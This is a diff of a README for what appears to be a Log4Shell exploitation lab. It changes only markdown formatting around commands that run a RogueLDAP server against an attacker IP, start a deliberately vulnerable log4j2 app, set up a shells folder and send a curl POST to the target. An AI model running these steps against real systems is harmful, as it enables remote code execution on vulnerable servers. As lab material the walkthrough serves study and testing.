@@ -60,18 +60,18 @@ java -jar RogueLDAP-1.4-SNAPSHOT.jar -i <YOUR-IP-ADDRESS>
 2. Open a new terminal window and run the vulnerable ```logging-log4j2``` application at the target machine
 
 
-### Run with Docker 
-
-```
-docker run -p 8080:8080 logging-log4j2-vuln
-```
-
-### Run with Java 
-
-```
-cd RogueLDAP/RogueLDAP/target
-java -Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector -jar logging-log4j2-1.0.jar
-
+>> ### Run with Docker 
+ 
+ ```
+ docker run -p 8080:8080 logging-log4j2-vuln
+ ```
+ 
+>> ### Run with Java 
+ 
+ ```
+ cd RogueLDAP/RogueLDAP/target
+ java -Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector -jar logging-log4j2-1.0.jar
+ 
 ```
 
 3. create a folder called shells at a preffered location at the attacking machine
@@ -121,7 +121,7 @@ curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -
 
 ------------
 
-### PoC
+### _Proof of Concept_
 
 The full log4shell exploitation can be seen below  
 
